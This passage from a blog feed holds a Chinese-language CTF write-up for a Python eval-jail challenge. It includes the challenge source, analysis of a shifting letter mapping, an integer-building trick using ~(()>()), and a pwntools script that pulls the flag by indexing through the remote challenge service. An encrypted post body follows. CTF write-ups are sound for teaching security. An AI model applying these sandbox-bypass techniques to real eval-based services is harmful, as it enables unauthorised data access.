title="Easy Jail"></a>Easy Jail</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">seed = random.randint(<span class="number">0</span>, <span class="number">2</span>**<span class="number">20</span>)</span><br><span class="line">shift_rng = random.Random(seed)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ProtectedFlag</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        self._value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;variable protected, sryy&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;variable protected, sryy&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self._value[index]</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;variable protected, sryy&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example flag</span></span><br><span class="line">flag = ProtectedFlag(<span class="string">&quot;flag&#123;dummy_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_mapping</span>(<span class="params">mapping</span>):</span><br><span class="line">    <span class="comment"># well guess how it was done &gt;_&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_initial_mapping</span>():</span><br><span class="line">    letters = <span class="built_in">list</span>(string.ascii_lowercase)</span><br><span class="line">    shuffled = letters[:]</span><br><span class="line">    random.shuffle(shuffled)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">dict</span>(<span class="built_in">zip</span>(letters, shuffled))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    valid_chars = <span class="built_in">set</span>(string.ascii_lowercase + <span class="string">&quot;[]()~&gt;&lt;*+&quot;</span>)</span><br><span class="line">    mapping = make_initial_mapping()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the shifting jail! Enter text using only a-z, []()~&gt;&lt;*+&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            user_in = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(user_in) &gt; <span class="number">150</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Input exceeds 150 characters&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(c <span class="keyword">in</span> valid_chars <span class="keyword">for</span> c <span class="keyword">in</span> user_in):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Invalid input. Only [a-z] and []()~&gt;&lt;*+ are allowed.&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            encoded = <span class="string">&quot;&quot;</span>.join(mapping[c] <span class="keyword">if</span> c <span class="keyword">in</span> mapping <span class="keyword">else</span> c <span class="keyword">for</span> c <span class="keyword">in</span> user_in)</span><br><span class="line"></span><br><span class="line">            mapping = shift_mapping(mapping)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = <span class="built_in">eval</span>(encoded, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;, &#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="built_in">print</span>(encoded)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\nGoodbye!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>限制我们的输入为<code>a-z []()~&gt;&lt;*+&quot;</code>，下划线、点都无法使用，但是它明确告诉了我们可以通过<strong>下标</strong>读取<code>flag</code></p><p>源码对小写字母做了<strong>映射</strong>，同时还有一个黑盒函数<code>shift_mapping</code>，每输入一次都会被映射<br>先找找字母表有没有<strong>映射规律</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">yvgkwuqnfiodhltjapcbmezsrx</span><br><span class="line">zwhlxvrogjpeimukbqdcnfatsy</span><br><span class="line">yvgkwuqnfiodhltjapcbmezsrx</span><br><span class="line">zwhlxvrogjpeimukbqdcnfatsy</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">czkoayurjmshlpxnetgfqidwvb</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">zwhlxvrogjpeimukbqdcnfatsy</span><br><span class="line">aximywsphkqfjnvlcredogbutz</span><br><span class="line">byjnzxtqilrgkowmdsfephcvua</span><br><span class="line">czkoayurjmshlpxnetgfqidwvb</span><br><span class="line">dalpbzvskntimqyofuhgrjexwc</span><br><span class="line">ebmqcawtloujnrzpgvihskfyxd</span><br><span class="line">fcnrdbxumpvkosaqhwjitlgzye</span><br><span class="line">gdosecyvnqwlptbrixkjumhazf</span><br><span class="line">heptfdzworxmqucsjylkvnibag</span><br><span class="line">gdosecyvnqwlptbrixkjumhazf</span><br><span class="line">fcnrdbxumpvkosaqhwjitlgzye</span><br><span class="line">gdosecyvnqwlptbrixkjumhazf</span><br><span class="line">heptfdzworxmqucsjylkvnibag</span><br></pre></td></tr></table></figure><p>发现每次都是上一次<code>+1/-1</code>的偏移，那这样就好办了，会有<strong>26个</strong>可能的字母表，<code>&#39;flag&#39;</code>会被映射成<strong>26种</strong>可能</p><p>同时在<code>Python</code>中，可以利用<strong>空元组</strong>构造数字，这里等号用不了，但可以<strong>取反</strong>，通过<code>~(()&gt;())</code>，可以构造出<code>-1</code><br>通过加号连接可以构造出任意负数，再乘<code>-1</code>可以构造任意正数</p><p>因为这里有<code>150</code>的长度限制，所以需要<strong>正向遍历</strong>+<strong>反向遍历</strong>，然后手动剃掉中间重复的字符即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_shift_string</span>(<span class="params">text, shift</span>):</span><br><span class="line">    shifted_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        shifted_ord = (<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        shifted_text += <span class="built_in">chr</span>(shifted_ord)</span><br><span class="line">    <span class="keyword">return</span> shifted_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_all_shifts</span>(<span class="params">base_alphabet</span>):</span><br><span class="line">    all_shifted_alphabets = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        shifted_version = caesar_shift_string(base_alphabet, i)</span><br><span class="line">        all_shifted_alphabets.append(shifted_version)</span><br><span class="line">    <span class="keyword">return</span> all_shifted_alphabets</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">&quot;misc-b6c94dd8.p1.securinets.tn&quot;</span>, <span class="number">7000</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;string.ascii_lowercase&#125;</span>&quot;</span>.encode())</span><br><span class="line">conn.recvline()</span><br><span class="line">table = conn.recvline().strip().decode()</span><br><span class="line">tables = generate_all_shifts(table)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> table <span class="keyword">in</span> tables:</span><br><span class="line">    t = <span class="built_in">dict</span>(<span class="built_in">zip</span>(table, string.ascii_lowercase))</span><br><span class="line">    <span class="built_in">map</span> = [<span class="string">&quot;&quot;</span>.join(t[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;flag&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag1</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">30</span>):</span><br><span class="line">        index = <span class="string">&quot;[~(()&gt;())*(~(()&gt;())&quot;</span> + <span class="string">&quot;+~(()&gt;())&quot;</span> * i + <span class="string">&quot;)]&quot;</span></span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> count:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(m) + <span class="built_in">len</span>(index) &gt; <span class="number">150</span>:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line">                conn.sendline(<span class="string">f&quot;<span class="subst">&#123;m&#125;</span><span class="subst">&#123;index&#125;</span>&quot;</span>.encode())</span><br><span class="line">                conn.recvline()</span><br><span class="line">                res = conn.recvline().strip().decode()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">1</span>:</span><br><span class="line">                    flag += res</span><br><span class="line">                    count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag2</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        index = <span class="string">&quot;[~(()&gt;())&quot;</span> + <span class="string">&quot;+~(()&gt;())&quot;</span> * i + <span class="string">&quot;]&quot;</span></span><br><span class="line">        count = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> count:</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(m) + <span class="built_in">len</span>(index) &gt; <span class="number">150</span>:</span><br><span class="line">                    <span class="keyword">return</span> flag</span><br><span class="line">                conn.sendline(<span class="string">f&quot;<span class="subst">&#123;m&#125;</span><span class="subst">&#123;index&#125;</span>&quot;</span>.encode())</span><br><span class="line">                conn.recvline()</span><br><span class="line">                res = conn.recvline().strip().decode()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(res) == <span class="number">1</span>:</span><br><span class="line">                    flag += res</span><br><span class="line">                    count = <span class="number">0</span></span><br><span class="line">                    </span><br><span class="line">flag1 = get_flag1()</span><br><span class="line">flag2 = get_flag2()[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Securinets&#123;&#x27;</span> + flag1 + flag2)</span><br><span class="line"><span class="comment"># Securinets&#123;H0p3p3_Y0u_L0ST_1t!&#125;</span></span><br><span class="line"><span class="comment"># Securinets&#123;H0p3_Y0u_L0ST_1t!&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;md7&quot;&gt;&lt;a href=&quot;#md7&quot; class=&quot;headerlink&quot; title=&quot;md7&quot;&gt;&lt;/a&gt;md</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CNSS-Recruit2025-Crypto-WriteUp</title>
    <link href="https://hvang10.github.io/2025/10/01/CNSS-Recruit2025-Crypto-WriteUp/"/>
    <id>https://hvang10.github.io/2025/10/01/CNSS-Recruit2025-Crypto-WriteUp/</id>
    <published>2025-10-01T14:53:10.000Z</published>
    <updated>2025-10-13T19:42:42.904Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ca8dc6c639e9de5bc915d43d58985b321d7647e9652bbbd0a14d61be203ceb80">1fdf028ba9067cdb279b99764cc0607e0af687b03a3226a154eb0053b482cc2b594115ad7499762d08ac799de8687a6cf85e4607f5e1587ce5ac0a3501297b6fec824d506025bf18b01e6172f58938aa5844a1dc74045099f501f2e7951c23119d9cfdb6275c5a05cdabca486eb44fbe6a9c30d017124f976b46b3f70a4aa76a2a7bba3059b9a4fd420fd80303acdf0396f695dd95330548d309091f468b25e02533902caf83db3ef91fe8fe6f2c5b56e9668d8404d0fdbb4032e4b3dc9657bed07b2c6f47773fefb80df83c2c527b00ff20cacfce2bcc777d0d00aeb177cb3e3a4e49ed879723bab9d81979f4ef282db1c7007d4c95814e7ce382e735b0ebcac0e97857641e542103f06a4b43dac08af5d5a8bf243d453420b6ddf30e83411497ab04c38f049dae8fb9163113a28a78fc69110dfe04402c5c61e529d87013259f27615abd1f89ffccd0f6462a6ea5fa304d1fa5fb4aeaf02eb27fb27726da48bed5fccba499ea3b30b449d076db058e6f8e73037b0151d425243c4b4538e9101c3d21a2584c952d15617ccfedaf6756c707e7989898a2a107b2e708d35fdb92a23b55b1db1cdcbc61e0c6b504295280c1d97c2bed28ee3ddae2c4453f1b1e95790727caadba2cdb62f74df44932861f3d17ee9869055c5e5c9364b853b9c9eaf7a1a89c8b61a8b43e0b0d3e6eb2a6ea70ae5290b41c365ebcb9be8b98b6de0c13e92b44f3cfbf524c4c63da05b0698a5910fcec89bd47b367246f808e0c891fa632107133725e03d3283e2caba50999673e723f23115dfb859ebac46129cb10719911ba256fa7204273ecbe3d4021efb2ba0c3dab959f44744978bdd388ec73b074a1bd004ba53b1bfb018c11a417a210d0639615248e07dc00468b167294eb04b783ad09046dc875f07285b11397021bb3bdf1ac3945a6918a6987013135bfe5990492753526b39ceafb9115db05a747b021648d08d99c7dc2d7ffcc321913a6c4e746c91ea08423f2bbe66370ef23f7701d60adb531daa240052860ee1a180be1d2e20a85a56b8aa12737d3e3f9c18e251f91358c74d49524ef471d3499c331d4d37f379efacdd04b9342c7e433b927252e05d7b01381e12910abe7f59a517f4a4fda7637a8f73b2013b1b230f28408cfb8d8fc9f5b60d3f0dfae01d3b0d4f51242c28836fc62b87a0c20c4f8c97dd1dadcfded51fd20b9fd3633f862ad70f02a6fccfc409ed52774f1edd8f837b17ee4f383f1931db330878cff69928eb969c946aac4a037ef2fac15d7c082a82e4f1f2f02bb6b3c5a46b1dc4cb5045929edcb08a48e389ae7735af3728521b102a8f8f35e2eba9cd5c883b59f83e78ca8699adb9fe187ead299bc605d1f724318d35bda55ab2c32a918ce36b31a60c470d59510cd579ded553a85d566381f995888ab9eccb06b201684bf4dfe94dd10cc8985bb0f4ccad9803600da4d562ef2df2626d85150e90b697a4ad355d1c74aa66c812da4735ccefdda3a179147e6870fa651ccbb13454c03f9a56bc0d16bee05b04316125923aa74aa86cdb9a3dbfa021719dd191a6de5fca87d556b908eaceefc6fc5f4ca0bf09110b8cc50e8a84e39fa7308db285d657f6b7ffc6fb4762557fd339155ae79e46bfb7e1f6f7679601c94dfa11bf4531ddb583c6035c8f1ddd73aa7cc0df5784c83c892ed4a846215e15d699be2e0fe0098efaadc0c2b7c8a7f847d1feb26d651aa071db0e72936b8ba66695b59f3e7374a95f502ace6fa2541d6b641a9de0c5971e836f83e4b054c6dd1b278eb73c9145f50093b0d85b534b9a91ae5440703c6db9ce45cf5d74f850e79ff3512403462f5cae7ce8c132c28e3a9bff01ab7c5768cedfb719bbd2ab3a6fd6751ac6528c2544115e1e84caa5e0ae3cfecedb683b67603f3f238f01dd0643d4ddce051e20d5caa159b3a40abdbd7c9bce754591d38e4bbeae3dd381d67d1e894ff2d4d150cd41e6613ffe52b40d2d5f944d562dfb7ac0e611c7d66020f2b6c700d6d8df941bdc13bccc4dc2616c4997e5f4086d249fe3054ff8ef3795a061664b38a5c432e84cc6df4f089d17c0c5b6051506f7c4988a3c37537fe7bf2324734c2e59aa7250d566ca1322397aba1cd669f1a45108123de17acc7dbdd5f75ff43dc8ee596c15071600d47cdb96aab477ea06817f67c629259d7b70fc6b0c9ef0a7d78e31c8e8f3e6e6bf8352d70b8ecd893e8641669423313247ad082c099d6ad89b41fc503778781e64a77de462543e08cc4c2185d83cbafbb5e2796e84134ad821b7b55e2ab56868b7cd55f00900b516bba745268865ea31e730cb2994ed232b372178491a7fd6e8b1c436ba264e58c1d6792dd3ab75e87aacae216fd222718b04386ca3902a90cef12964ff619881742b3743defaafc0da611c4bd5dc92c98e6377aa90f37c232cc194585c82b135c3c9dc4e087c65425b891db9bcb37e408ad713d3f5eb11671a7b5a43b150a8ffc6318b9d6739e5c1600ddd7f530b210ac4c328aa4b5da5e13948cfc6ea78b3ce372aecf56883938b7bd0069471e670081a76287fb9915e2db0b425dbd1dc120b8290f2786e20f941dc96063e4bdc2329f4721f0723068a92537031d1545800df23c4a967a413939ecf74cb42b0747ff65511ed8d1a8202366b56723c2d6feeab1ef9dba5ac961cbd1bedbb05b464eefa28bb88ab96ddd9728d4e61cd79d8d602d91f5bdcc4fb297f9ce05500d463dbea248301d5877579cfce2745914cc29ac009fc7b7863012bb1558e3c41871626ff562fb8e74bf9d561e26078226d9931eb5915c55676a91a9c7c7c3088b432fb0488b76ecf6dcd63441e7cebd5e61db57ddf5eee33f4541ec63a2267fb1b148dac7ab88ea81cc095c80f46d16b8cd986c812552cd00422ea9b34664fb6c8f75454122dd2b74db397d4409c0f604bcbc234ca8e9f12db42b2d77696864935ea56f1165e8a49fd0e59a8686d288def602ad87a84b1347f0d014d1b96bdb639de611830422a8b54fdba872a0982a039abb09a6286db28db42858d280d5d9f2c257ab98648d57ee6681331b9b682568d336184d731670444ae07f45b57078e44eee3641c5b3f12a30ec5719e16e76d56782de311f043201e31904304a59e4569992ff003ae6cb68ee2d4fbb34fb7a7414edae18a8636e0efd3cfe2cadc0768597a1ab81ca86b287fc533803ad2c6f38132217a595f6cebd12bdbff7b4f21cf92304c391001a853ff3e3a89d5a8b8748ecaac5d3447ce5799731f4196a833e8b233f08cf9fd0349afd27e56e7767c5895a6b2585373d3b17121c2c65ff03a03e9e74d2cd0d7d234efb351ade3d08b3d50b14d137d7569ca66d0ceb24852068e6e8309d9895b17adbc3b990063b0b711cbf61ff9afb32ee72d7f0b40b88a62b22bcc575cf823323f9cf672fa64eed03751d3a51b56d6c1e5d61f8b960b989ae522e5cb80b8585dfe87711bbf2422bd801a0187ea32ebb1a81b26920465a2cfbb84213ae989f006f9bcb56be4e69dc5a5e77f2dc8f85b6d57f93d7d668d084a5a6e542f1d0a85c3c180ca76f0627e14229fa5ea00450828234ded2f78e715c0581a541be38f663d0ba5420bd4f6465eaafab75d048f878fbed35b3bc4a602b54cb8556a61ffe11d3bb757567db442dae2f4f03cf11269a829d0058cbd42162d2dd124dcc97b218a81833cb943f73b1610586369b7159a3bba4eada5a8c653376047b0585e0e5b3f6ed37c43d3bf2154dce13764dfb5721820b34808b05ae634c8c042d2bb5d03d6191e16805560c8965907c29c8294f223fe2d9e6dea63734437924c452228d24df94ae906241f110b23bd6a4769bea61b1293168bb8a4442f471685a4596dab2ecd85084957e411ec9bedfb3fdbc1dd35e1e6864f20060439a23d3f646165e588d9b70986eca8e5a911dd4e8efba8a07e3df48ef91d25cabb77bfb693621c31b5f5a715e9824bcbebedbd288ae1ee04dd05616b555de43e940c6605985c7fc3f7e6938eb670e01bb62b18c50aa815a5040675482cfed248e97531bca075500510a7d66dbc34cf56602eb6208f16c38a94b7ba581e09e3e5f3e7ede55c5855fa9caf4436ead861359e152d526fef998250864250298c4dc3a458e66f44be25b680c53f0ca65a13ce7d838372d490b9a7a7ad3bb48f1a682186b88889c5b2adc7cdbe99ddb7e689e7e69b7369bb4cc9241ca96c0cbbd878e5355b1e98c6f35c4e74e8018037f1a0c26d026d7075e44d6a2d60c5abe8860a3a227900392b9d47c411bf213acbfc948f0b86ad3ef6b1e6350e5acf80f115262ac601c07c30db26401897fedd3b8fcad88dd21c7d4c5243f7dddee7eac1b3a253ca210a9035eb7ac02b677f7fe26c56126555711bc5cff767a9c6c0bf6a02183c434fc3b618ba4357ef389440df4b598be477688766efc2ea08cd714e88939bcc8ba63d566e9ffc1c165cebe7a7f6d801a58cbf05ef9a4e62ed5a8c5d200bb8b061c7afd62f43759c7b31a3cee523a11bf08fe356c5f7f5640e748e13ea6e731a839878f3e83fd54516868021c6dd0606829a45e05fa00ab71963fee294109e110b306f2c74508240d178edb17fe50bba898a12955d68c3259c45c8d39e3b7f851df40d0cdfb58dff13c340fb7a6c5bb7f3b9b2cae29d8ed4c6b03850fd0f9fa2493c7caa49bc781305bcb01bad7ea4a784e315c4a6eb9ae4928f295fa1086187f014776a4c3f68e6b5535c43f157d1e467a197f6e4700683af914214a4bbb54a9d411ad23635709f9015a14726b8f94d80ab831c6f2519bf047d2eca29a808773106e49c44943d11f9691b65c66a82de777f1cddaa87a1229d998c924362c3265ad7d5d603fab78be7d8efec145b37f9db851f5bbd943fd1ec6f96e26e9027381cdff3d2948d1594b3f13b6bfe595ad3844a013b062fe12b7b289fbf17f535d3d1ed718a37c9e549c56a54fafaf7452ee69ce61e85adfcc2171c6bc002cd0571340cdb4cfd3385e30a94d00997a788bac95c03a52d0b0ecb98e65879275766e0cf05584b882a41450ea0bb8f50d2bdd43feebd7d3cb1f4a65d14402810841f4466cadefa83a679755474a3c6596ae02abf99d35816316d7648473dece9d2d71b48ea7988e61d6127c1612eba34c01db096fa7df927a0ac908689f751ec5746d248501a0d16a38d0814279a231fc08215dced8b8afec586ecfb7e4ced68805ee9d97af6543ff1376f5cbfcde30bbd7cb1ce73a9e9966d9cc81b61179ea13dd5f6b5fae2b7b8319a22135dc23acb082a93345dc74f31ef4f9a5f9851032b1e05237d572e0045c5f7fea6ffd8993bb8e16c42d6e35052bae1f24f2af77756214b98b4e0469148bfc655c475550bfb7a40ada57a2d3c20d812e82c2936739178e16dc1e04d04bd31420181400116fdace777a50d7ba024a82e223091aaa8a3bec566aa67c88232de72f3aebe213d1946f99f28a58f01a38f162b7657e56b9e946b50ca6d7b38149052ca808e4504b1b37596b2bb9f0dba44e46b588c55e0041fd6f408354bc0e076903beac29fa97f56088c8746f6d89b46b12f2c58654e4e826a71c5c5690cb9756d62dabf8c77ed66fdb65d5886c11223a5ae5e298871e0be923c5a8905653fbe419234458efd9f2b6ef8fd72ebd2d931ee6ed116124693a1b5349fd4f93bd77ee592faf90d1c659f2476a7372e9367d67f2c5e3a9bef7837f15949b3f5f26adf1cb4f7ca77b6396b4f4b6fa180df58a4eea6f35f7703780e1ddc11b13975d1ccbb7160c6f3542885d00788ffab3df028f813f2239f4dbf33b52c50740343476c5216ac4c3806562b3984732f72bcf6234a06df5a50d7148b0e57f8b714089b6bede890779d2ae639f51dabf80d143990c6597d0db2ddcfcdd56ece67a6042c8e6fa45c02f3bbc97e6c26bcd7d3121e712848df27305627f3143b61fb1c72c9b6862b0b159f92062b75d525cd0838189cf813f604bdc2407427122c8474b69fb0e066c43ffc85fcfcc7185a91df3d5295ee95258b586b00408b77b9a9b4d3876cfb69915c5e5cdd6f0dcbee1a3403ae4af49048a808d2ea7dd64df50550b98e15e35543581e17c6e5ee255d553d57f03c93404f1a2f30b7c37c0056adfff4b064a20ae02b8f3599d96be1f6d7a20b5c4ce9a059f1700cd9e7ec98fd2516148193e3e5bea9d98e509db7e047b9b1710f4fb567a5d8401a9f4e77c2a143e5990c3b0e29e7103f3c7a71beae92b8a50320c10177914c8dfda756e96b2e070b28f9852770ae5b5ce9c5ec7fab96bbc1d80e7ee6c07e894534de3937b16a83267413092dc7261566d0e73c1125ce7b0dce2be6e019097e901b71f5c1492c0e1e7cac9e21e7fb3ad5f9080faa7707ab9a4598c47dac23e3abcfb417245fa71b87df01884a3e70f5a9215a04dc6e844a7ccae4440bee507c3261f0b1480ccdb91506a5d757162f0099f1b525a6975f86d2c470e54fb2471f57fd4173a24a5b7f67feca876fd4f0804712d48dd3a2c03cb0608c1cb507f0c3908f2322c14b6819161c1859b8c5772b0f87d0697e844fc2063cf65136b3497e4940e605645b0a9882de2ad8c03796fb54c0e3ff86df8ab795481d9fb944703e9da903fda3628eacab96973514c45e949e52d12ae25914d271992350de310cc023e14034ad726e6be0fc7868df90944bdf27d7d6d5071edf52cbbaf4b6b1bdf120cbc89301ebf120ea5c0e27558e7d2d0412bf5e72ee1d0570fe469fcaf2650573d630c4c264bbc8b429fe16f3b0b978510c2b9cb420e26cbdeb586fbfea062441c7faaebed6372eb2df5411daa918a902899aebd01bb8dd12914226ed7abfaed2f11379048268167536a31117ef096ed71fbf9cb2a427fec9eafc7daf4fface5b3e882f0031d8ee2bd764425f2ac335149c5de7deb22db1fcba80390d174f25fc7e1d037be5139a28b3ddd42466b3ee4dcafd844a1a7ecf33546dd6ebd9375dd52a6f55d84e15c7dab3ee556243fbde66911480e62214f8f75ba7edf2d4dadbb9e245e284fd6c25d375cf160d084549d4d3d0c4a42e06a87bac3f3ecc485485802b49e4125aa514af53fc3c8715bbc0569da51070fadbf40e1737faecca8ba36f203b938edfa3d2ef9c672c0b6804170816b5bde14b057190e584587ea5294fd640bc6ec3343e24d7317d154ac6ec1876c2c5f35bc6974d52f1f0b90b283142f50e046b35091d748d8457f22a682ad5a18fc7b06fb5cff378314a237b455a0835cf42ddaea4e60e7aba186a0bcf4bd7213feb976f1952a6c14062ea8a70cb5de8ea357d7340cdc388b3a936d2fa943fd0342e2faff20bd972b8668aee3c984cba6321983694fa710263dc4c35e094814da30add07487dcebfa99538bfd8218633742f80e43f825825b3a56148ed1ed94a472c21ddaaeba7e0012e7593d2099d30ab9a1787438abd8a2f902e1543ecc1a5df59a56bbde454433bda7623fc2a83f3757412a04c0cd7c9f4b9953981eda389ae93d968cea5b0b3d6a77cc80d16951ecdd78341fd9419de43d501ed4954ee69add9d49777c6949e567311b1475bdb440c87555cb59d142892e250cd9f1a54dc0386f9d7cf5e130e1fe16cc4654748ddfe3ed5f458859224aad9372a4d1288fc1a3131a86d378c0d0a1e60ce758de39a683b156e6b2a7531e7e765147016e717a6f9af4a750febd60dd9f83069be1926746b168cdd43bd6447ff16b0784427b4587bdbf4619c9ca5bc07b77be014439e218531a82ac1eefb3106792bc4cafb162839b4dfe440d35533bdd619ff975fb0e56536c092c19691a90787811feb1f09a0ceb2a9765087b94c26ed6c4597aa5dacebaa6c728b8a64b051af2a207e4ab34fc9d37325abffe798d823f21e53559a2c3381831cef7c44aae6875522867c7afb749c5578c9131fcc5c4293f2bef7a4e4fe724faf580dbc4cb976d84c2e605b11d12efc3a6255caaef0244cb788f47c357fa839c6e62c15ec35ec91a6c321fcb7c8e5f9680eaef11e34ef792674f00f6b42d90f62f4543d207a61860dd7114dd38d93942244858a2c57c47b7d341b055f9aee092aaab01391e06aeac752abb94e6384061eb0d8c2ff0cdac4e0fbd86ccefd8aca440ebfa207e8010dd3147ce73716e2a83e4db89263f6aabdf05b7e27e96d5d334cb27d3973e76f020c60f80af20b84de4164a1a3c32d23d0493e83945e598e8de70ce4fbfe48037bd29df56ca514d06b339b48bf77c23cd452b31a55ba045907687f3510496476bd5d87dfc334363573ed6f0ba115871f5f2a71b90f97c93f1f3795e4a812f1d8468506b3a5a4220064944aee5757ba1bd09a03208b42f1ef85e806447968300188f426619edeb3ebe972b85ce56d8deece4ad37b392b89aa425d05a23113d8a67e5a228e827b6bcbd9295f89a14546259a57d72377cd813f2d53764e8efe86576d70cf5d19fabfcf2d394699fe84744612b6bf709bb72f0e333c1f041be2ff035c240a160bec08bb3655f494dc974598f66b2917a7c968309283f33095489de53355f15b48ceb0d8e6e57511d2bfaddb0b754ab78746706959f5c48af193ece079df7ee66f59eb3c4eb6ccf6f797276a51d41d86bb945a609978ee01ac17da11d585082b52a4a539e91c0c1e286ff1bb3ccf5047fee5fb054b0eddbd47f984d26cae01fd3a22b5b050af8925ec541fca80e4d6bdf46945b8c9f11831ec059f8e1fb27cc11811c6af38cfa320ad8b94ab4c98ad375b6627843cd5bc6ff9c9a5fc49fc6f7064ffb649dcc358aea30caae0f4b84cdbda59c72b00f5d27c9cf8b6b365577fff79382c263e8c876c69617a76ad03d9b6c893386c5c02c04d14412cfbb7c45a395e6dc5de340b48781d99faf2215ed1e224a1ee6faa02abe3aa95e2c576bee84c56e8a7395c3d205425834c3b98e505d8b35f407d14aa8d97a14eb039caa77f52c